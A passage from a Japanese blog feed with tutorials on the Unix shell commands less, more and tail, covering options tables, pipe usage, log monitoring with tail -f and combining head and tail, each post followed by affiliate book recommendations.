&lt;td>指定した行から表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">+/文字列&lt;/td>
&lt;td>&lt;/td>
&lt;td>指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-p文字列&lt;/td>
&lt;td>&amp;ndash;pattern=文字列&lt;/td>
&lt;td>指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-oファイル&lt;/td>
&lt;td>&amp;ndash;log-file=ファイル&lt;/td>
&lt;td>パイプ（｜）などで標準入力から入力した内容を表示する際、指定したファイルにコピーを保存する。既存ファイルを指定した場合は、上書きするか、追加するかを確認するメッセージが表示される&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-Oファイル&lt;/td>
&lt;td>&amp;ndash;LOG-FILE=ファイル&lt;/td>
&lt;td>「-o」と同じだが、既存ファイルを指定した場合は、確認せずに上書きする&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-kファイル名&lt;/td>
&lt;td>&amp;ndash;lesskey-file=ファイル名&lt;/td>
&lt;td>lesskeyファイル（キー定義ファイル、「lesskey」コマンドで生成）を指定する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-L&lt;/td>
&lt;td>&amp;ndash;no-lessopen&lt;/td>
&lt;td>環境変数LESSOPEN（lessコマンド用のオプションを定義した環境変数）を無視する&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="lessコマンド詳細説明">lessコマンド詳細説明&lt;/h2>
&lt;h3 id="テキストを1画面ずつ表示する">テキストを1画面ずつ表示する&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ less ＜ファイル名＞
&lt;/code>&lt;/pre>&lt;p>で、指定したファイルを1画面ずつ表示します。&lt;br>
次の画面へ進みたい場合はスペースキー、1行ずつ進めたい場合は［Enter］キーを押します。&lt;br>
上下の矢印キーや、［y］または［e］キー、［j］または［k］キーで上下にスクロールすることも可能です。&lt;br>
［q］キーを押すと終了します。&lt;/p>
&lt;p>以下のような使い方もできます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat &amp;lt;filename&amp;gt; | less
&lt;/code>&lt;/pre>&lt;h3 id="キー操作のヘルプを表示する">キー操作のヘルプを表示する&lt;/h3>
&lt;p>lessコマンドで画面を表示中に［h］キーを押すと、キー操作のヘルプが表示されます。&lt;br>
ヘルプの表示中でもlessコマンドと同様に、上下のスクロールや検索などの操作が可能です。&lt;/p>
&lt;p>［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります&lt;/p>
&lt;h3 id="長い行を折り返さずに表示する">長い行を折り返さずに表示する&lt;/h3>
&lt;p>lessコマンドでは、画面の横幅より長い行は折り返して表示されます。&lt;br>
折り返さずに表示したい場合は、「-S」オプションを使用します。&lt;/p>
&lt;p>左右の矢印キーまたは、［ESC］キーに続いて［(］および［)］キーを押すと、左右に半画面分スクロールします。&lt;br>
横スクロールの幅は「-#」オプションで指定できます。　&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | less -S
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>（5）【more】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-13-01-more-suzuki/</link><pubDate>Sun, 13 Feb 2022 16:35:41 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-13-01-more-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-13-01-more-suzuki/bash.jpg" alt="Featured image of post （5）【more】シェルスクリプトコマンド活用紹介" />&lt;h2 id="moreコマンド">moreコマンド&lt;/h2>
&lt;ul>
&lt;li>長いメッセージやテキストファイルを1画面ずつ表示する&lt;/li>
&lt;li>テキストを1画面ずつ止めながら表示する&lt;/li>
&lt;li>実行結果を止めながら表示したいときにはパイプを使う&lt;/li>
&lt;li>確認したい箇所がある場合は「+/オプション」でスキップ&lt;/li>
&lt;li>行番号付きで表示したいときはcatコマンドと組み合わせる&lt;/li>
&lt;li>moreコマンドで使える主なサブコマンド&lt;/li>
&lt;/ul>
&lt;h2 id="moreコマンド概要">moreコマンド概要&lt;/h2>
&lt;p>moreコマンドは、テキストファイルを1画面ずつ表示するページャコマンドです。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ more &amp;lt;ファイル名&amp;gt;
&lt;/code>&lt;/pre>&lt;p>で実行する他、&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat &amp;lt;ファイル名&amp;gt; | more
&lt;/code>&lt;/pre>&lt;p>のように他のコマンドの実行結果を1画面ずつ表示する際によく使われます。&lt;/p>
&lt;p>　また、moreコマンドにサブコマンドがあり、［Enter］キーで1行、［スペース］キーで1画面先に進み、ファイルの末尾まで表示されると終了します。ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。&lt;/p>
&lt;h2 id="moreコマンドの書式">moreコマンドの書式&lt;/h2>
&lt;p>more [オプション] filename&lt;br>
cat filename | more [オプション]&lt;/p>
&lt;h2 id="moreコマンドの主なオプション">moreコマンドの主なオプション&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>オプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>+数値&lt;/td>
&lt;td>数値で指定した行から表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>+/文字列&lt;/td>
&lt;td>指定した文字列を検索して、見つけた行の2行上から表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-s&lt;/td>
&lt;td>連続した空行を1行にする&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-l&lt;/td>
&lt;td>改ページを無視する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-u&lt;/td>
&lt;td>下線の処理を行わない&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-数値&lt;/td>
&lt;td>画面の行数を指定する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-f&lt;/td>
&lt;td>画面での行数ではなく、データの行数を表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>-d&lt;/td>
&lt;td>無効なキーが入力された場合には、ビープ音の代わりに簡単なヘルプを表示する&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="moreコマンド詳細説明">moreコマンド詳細説明&lt;/h2>
&lt;p>「cat」コマンドでテキストファイルの内容を表示したら、思ったよりも長くコマンドを実行した結果がどんどん上に流れてしまって、テキストファイルのの最初の方が読めない！ そんなときに便利なのが「more」コマンドです。&lt;/p>
&lt;p>moreコマンドは、「more ファイル名」で指定したファイルを1画面ずつ止めながら表示します。次の画面へ進みたいときは［スペース］キーを、1行ずつ画面を進めたいときは［Enter］キーを押します。&lt;/p>
&lt;p>ファイルをページャとして読みたい場合&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat &amp;lt;filename&amp;gt; | more
&lt;/code>&lt;/pre>&lt;p>dmsgなどのシステムファイルをページャとして読みたい&lt;/p>
&lt;pre tabindex="0">&lt;code>$ dmsg | more
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>検索を行う場合はページャ画面で「/」記号に続けて検索文字列を入力し、［Enter］キーを押すとその位置までスキップします。nで直前の検索を繰り返します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>（４）【tail】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-11-01-tail-suzuki/</link><pubDate>Fri, 11 Feb 2022 14:31:57 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-11-01-tail-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-11-01-tail-suzuki/bash.jpg" alt="Featured image of post （４）【tail】シェルスクリプトコマンド活用紹介" />&lt;h2 id="tailコマンド">tailコマンド&lt;/h2>
&lt;ul>
&lt;li>tailコマンドでファイルの末尾部分だけを表示する&lt;/li>
&lt;li>ログファイルを監視する&lt;/li>
&lt;li>ファイルの特定の範囲の行を取り出す（headとtail）&lt;/li>
&lt;/ul>
&lt;h2 id="概要">概要&lt;/h2>
&lt;p>headコマンドとは逆に、ファイルの末尾だけ表示するのがtailコマンドです。&lt;/p>
&lt;p>ログファイルは、基本ファイルの末尾に新たな記録が追加されます。&lt;br>
「more」コマンドや「less」コマンドで表示しようとすると、末尾まで進むのが面倒だし、ファイルが大きい場合は読み込むのにも時間がかかります。&lt;br>
「tail」コマンドは、ファイルの末尾開かないので手軽で処理も高速です。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat ＜ファイル名＞ | tail
&lt;/code>&lt;/pre>&lt;p>tailコマンドも、headコマンド同様、「-n」オプションで表示する行数を指定することができます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat ＜ファイル名＞ | tail -n10
&lt;/code>&lt;/pre>&lt;p>また、tailコマンド最大の魅力は リアルタイムに出力を追記する tail -fです。&lt;br>
ログ監視などに多用されるこの具体例も以下に示します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo tail -f /var/log/httpd/access_log
&lt;/code>&lt;/pre>&lt;h2 id="tailコマンドの書式">tailコマンドの書式&lt;/h2>
&lt;p>tail [オプション] ファイル名&lt;/p>
&lt;h2 id="tailコマンドの主なオプション">tailコマンドの主なオプション&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">短いオプション&lt;/th>
&lt;th>長いオプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">-c 数字&lt;/td>
&lt;td>&amp;ndash;bytes 数字&lt;/td>
&lt;td>末尾の指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=1000&lt;em>1000, M=1024&lt;/em>1024…）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-n 数字&lt;/td>
&lt;td>&amp;ndash;lines 数字&lt;/td>
&lt;td>末尾の指定した行数のみ表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-q&lt;/td>
&lt;td>&amp;ndash;quiet, &amp;ndash;silent&lt;/td>
&lt;td>ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-v&lt;/td>
&lt;td>&amp;ndash;verbose&lt;/td>
&lt;td>常にファイルごとのヘッダ出力を行う&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-f&lt;/td>
&lt;td>&amp;ndash;follow&lt;/td>
&lt;td>ファイルを監視して内容が追加されるたびに末尾に表示する（ログ監視などに使用する。［Ctrl］＋［C］キーで終了）&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="tailコマンド詳細説明">tailコマンド詳細説明&lt;/h2>
&lt;h3 id="tailコマンドでファイルの末尾部分だけを表示する">tailコマンドでファイルの末尾部分だけを表示する&lt;/h3>
&lt;p>ファイルの末尾を表示します。tail -n で表示行数を変更できます。&lt;br>
tail -n10 と デフォルトの tail は同じ出力となります。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | tail -n10
&lt;/code>&lt;/pre>&lt;h3 id="ログファイルを監視する">ログファイルを監視する&lt;/h3>
&lt;p>tailコマンドの「-f」オプションを使うと、ログファイルのように、刻々と内容が追加されていくファイル監視ができるようになります。「-f」は、ファイルなどを監視する際、内容が新たに追加されるたびに末尾に表示するオプションです。ログの監視を終了するには、［Ctrl］＋［C］キーを押します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo tail -f /var/log/httpd/error_log
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>tail -f コマンドはとてもよく使います。&lt;/dd>
&lt;dd>tail -f を実行するtailf コマンドもあります。(Oによりますが)&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h3 id="ファイルの特定の範囲の行を取り出すheadとtail">ファイルの特定の範囲の行を取り出す（headとtail）&lt;/h3>
&lt;p>ファイル後ろの200行目のところから、ファイル先頭に向かって100行を取り出すにはどうしたらよいか？&lt;/p>
&lt;pre tabindex="0">&lt;code>cat filename | tail -n200
&lt;/code>&lt;/pre>&lt;p>これだとファイル末尾から200行を出力するにすぎない。&lt;br>
tail コマンドのみに頼ろうとすると難しいようだ。&lt;br>
実は、head コマンドも使えば、「後ろ200行の先頭100行」を取り出せる。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | tail -n200 | head -n 100
&lt;/code>&lt;/pre>&lt;p>コマンドの実行結果の10001行目から10100行目までが欲しい時は以下の通り。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | head -n10100 | tail -n100
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
